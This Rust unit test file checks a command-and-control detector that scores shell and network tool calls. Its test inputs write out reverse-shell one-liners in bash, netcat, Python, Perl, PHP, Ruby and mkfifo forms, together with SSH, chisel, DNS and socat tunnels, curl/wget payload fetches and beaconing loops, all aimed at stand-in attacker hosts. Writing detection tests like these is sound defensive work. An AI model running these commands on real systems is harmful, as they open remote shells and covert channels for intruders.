//! Extended unit tests for Command and Control Analyzer
//!
//! Tests C2 communication and reverse shell detection
//! Based on actual analyzer implementation patterns

use super::test_utils::*;
use threat_engine::analyzers::command_and_control::CommandAndControlAnalyzer;

// Reverse shell tests - patterns from analyzer

#[test]
fn test_bash_reverse_shell() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Pattern: "bash -i >& /dev/tcp/"
    let result = analyzer.analyze(&bash_call("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"));
    assert_threat_above(&result, 95.0);
    assert_pattern_detected(&result, "Reverse shell");
}

#[test]
fn test_netcat_reverse_shell() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Pattern: "nc -e"
    let result = analyzer.analyze(&bash_call("nc -e /bin/bash attacker.com 4444"));
    assert_threat_above(&result, 95.0);
    assert_pattern_detected(&result, "Reverse shell");
}

#[test]
fn test_ncat_reverse_shell() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Pattern: "ncat -e"
    let result = analyzer.analyze(&bash_call("ncat -e /bin/sh 10.0.0.1 4444"));
    assert_threat_above(&result, 95.0);
}

#[test]
fn test_python_reverse_shell() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Pattern: "python -c 'import socket"
    let result = analyzer.analyze(&bash_call(
        "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444))'"
    ));
    assert_threat_above(&result, 95.0);
}

#[test]
fn test_perl_reverse_shell() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Pattern: "perl -e 'use Socket"
    let result = analyzer.analyze(&bash_call(
        "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))'"
    ));
    assert_threat_above(&result, 95.0);
}

#[test]
fn test_php_reverse_shell() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Pattern: "php -r '$sock"
    let result = analyzer.analyze(&bash_call(
        "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ));
    assert_threat_above(&result, 95.0);
}

#[test]
fn test_ruby_reverse_shell() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Pattern: "ruby -rsocket"
    let result = analyzer.analyze(&bash_call(
        "ruby -rsocket -e 'f=TCPSocket.open(\"10.0.0.1\",4444).to_i'"
    ));
    assert_threat_above(&result, 95.0);
}

#[test]
fn test_mkfifo_reverse_shell() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Pattern: "mkfifo /tmp/"
    let result = analyzer.analyze(&bash_call("mkfifo /tmp/s; cat /tmp/s | /bin/sh -i"));
    assert_threat_above(&result, 95.0);
}

// Remote access tools

#[test]
fn test_ssh_reverse_tunnel() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Pattern: "ssh -R"
    let result = analyzer.analyze(&bash_call("ssh -R 8080:localhost:80 attacker.com"));
    assert_threat_above(&result, 80.0);
    assert_pattern_detected(&result, "Remote access");
}

#[test]
fn test_ssh_dynamic_tunnel() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Pattern: "ssh -D"
    let result = analyzer.analyze(&bash_call("ssh -D 1080 attacker.com"));
    assert_threat_above(&result, 80.0);
}

#[test]
fn test_ngrok_tunnel() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Pattern: "ngrok"
    let result = analyzer.analyze(&bash_call("ngrok http 8080"));
    assert_threat_above(&result, 80.0);
    assert_pattern_detected(&result, "Remote access");
}

#[test]
fn test_chisel_tunnel() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Pattern: "chisel"
    let result = analyzer.analyze(&bash_call("chisel client attacker.com:8080 R:8081:localhost:80"));
    assert_threat_above(&result, 80.0);
}

#[test]
fn test_proxychains() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Pattern: "proxychains"
    let result = analyzer.analyze(&bash_call("proxychains nmap target.com"));
    assert_threat_above(&result, 80.0);
}

// Tunneling tools

#[test]
fn test_iodine_dns_tunnel() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Pattern: "iodine"
    let result = analyzer.analyze(&bash_call("iodine -f tunnel.attacker.com"));
    assert_threat_above(&result, 85.0);
    assert_pattern_detected(&result, "Tunneling");
}

#[test]
fn test_dnscat_tunnel() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Pattern: "dnscat"
    let result = analyzer.analyze(&bash_call("dnscat2 c2.attacker.com"));
    assert_threat_above(&result, 85.0);
}

#[test]
fn test_socat_tunnel() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Pattern: "socat"
    let result = analyzer.analyze(&bash_call("socat TCP-LISTEN:8080 TCP:attacker.com:443"));
    assert_threat_above(&result, 85.0);
}

#[test]
fn test_stunnel() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Pattern: "stunnel"
    let result = analyzer.analyze(&bash_call("stunnel /etc/stunnel/stunnel.conf"));
    assert_threat_above(&result, 85.0);
}

// Suspicious ports

#[test]
fn test_suspicious_port_4444() {
    let analyzer = CommandAndControlAnalyzer::new();
    let result = analyzer.analyze(&bash_call("nc -lvnp :4444"));
    assert_threat_above(&result, 70.0);
    assert_pattern_detected(&result, "port");
}

#[test]
fn test_suspicious_port_1337() {
    let analyzer = CommandAndControlAnalyzer::new();
    let result = analyzer.analyze(&bash_call("python -m http.server :1337"));
    assert_threat_above(&result, 70.0);
}

#[test]
fn test_suspicious_port_31337() {
    let analyzer = CommandAndControlAnalyzer::new();
    let result = analyzer.analyze(&bash_call("nc target.com :31337"));
    assert_threat_above(&result, 70.0);
}

// External connection detection

#[test]
fn test_curl_external_http() {
    let analyzer = CommandAndControlAnalyzer::new();
    let result = analyzer.analyze(&bash_call("curl http://evil.com/payload.sh"));
    // Should detect external connection
    assert_threat_above(&result, 65.0);
}

#[test]
fn test_wget_external() {
    let analyzer = CommandAndControlAnalyzer::new();
    let result = analyzer.analyze(&bash_call("wget http://malware.com/trojan"));
    assert_threat_above(&result, 65.0);
}

// Safe operations - should NOT trigger C2 detection

#[test]
fn test_safe_ls() {
    let analyzer = CommandAndControlAnalyzer::new();
    let result = analyzer.analyze(&bash_call("ls -la"));
    assert_safe(&result);
}

#[test]
fn test_safe_cat() {
    let analyzer = CommandAndControlAnalyzer::new();
    let result = analyzer.analyze(&bash_call("cat /etc/passwd"));
    assert_safe(&result);
}

#[test]
fn test_safe_grep() {
    let analyzer = CommandAndControlAnalyzer::new();
    let result = analyzer.analyze(&bash_call("grep pattern file.txt"));
    assert_safe(&result);
}

#[test]
fn test_safe_ssh_normal() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Normal SSH without -R or -D
    let result = analyzer.analyze(&bash_call("ssh user@server.com"));
    assert_safe(&result);
}

#[test]
fn test_curl_localhost_suspicious_port() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Port 8080 is in suspicious ports list, so it triggers regardless of localhost
    let result = analyzer.analyze(&bash_call("curl http://localhost:8080"));
    assert_threat_above(&result, 70.0);
}

#[test]
fn test_safe_curl_127() {
    let analyzer = CommandAndControlAnalyzer::new();
    let result = analyzer.analyze(&bash_call("curl http://127.0.0.1/api"));
    assert_safe(&result);
}

#[test]
fn test_safe_wget_private_ip() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Private IPs (10.x, 192.168.x) are excluded
    let result = analyzer.analyze(&bash_call("wget http://10.0.0.1/package.tar.gz"));
    assert_safe(&result);
}

#[test]
fn test_nc_listen_triggers_external_connection() {
    let analyzer = CommandAndControlAnalyzer::new();
    // nc triggers external connection detection pattern
    let result = analyzer.analyze(&bash_call("nc -l 8000"));
    assert_threat_above(&result, 65.0);
}

// Edge cases

#[test]
fn test_empty_command() {
    let analyzer = CommandAndControlAnalyzer::new();
    let result = analyzer.analyze(&bash_call(""));
    assert_safe(&result);
}

#[test]
fn test_unicode_in_command() {
    let analyzer = CommandAndControlAnalyzer::new();
    let result = analyzer.analyze(&bash_call("echo '\u{1F4E1}' > output.txt"));
    assert_safe(&result);
}

#[test]
fn test_case_insensitive() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Case insensitive matching
    let result = analyzer.analyze(&bash_call("IODINE -f tunnel.com"));
    assert_threat_above(&result, 85.0);
}

// Multiple indicators

#[test]
fn test_multiple_c2_indicators() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Multiple suspicious elements
    let result = analyzer.analyze(&bash_call(
        "nc -e /bin/bash evil.com :4444"
    ));
    // Should hit both reverse shell and suspicious port
    assert_threat_above(&result, 95.0);
}

// Network tool calls

#[test]
fn test_network_suspicious_url() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Only URL is analyzed for network calls
    let result = analyzer.analyze(&network_request("GET", "http://c2server.evil.com:4444/beacon"));
    assert_threat_above(&result, 70.0); // Suspicious port detection
}

// Beaconing patterns

#[test]
fn test_beaconing_curl_loop() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Pattern: "while true; do curl"
    let result = analyzer.analyze(&bash_call("while true; do curl http://evil.com/beacon; sleep 60; done"));
    assert_threat_above(&result, 85.0);
    assert_pattern_detected(&result, "beaconing");
}

#[test]
fn test_beaconing_wget_loop() {
    let analyzer = CommandAndControlAnalyzer::new();
    // Pattern: "while true; do wget"
    let result = analyzer.analyze(&bash_call("while true; do wget http://evil.com/cmd; sleep 30; done"));
    assert_threat_above(&result, 85.0);
}
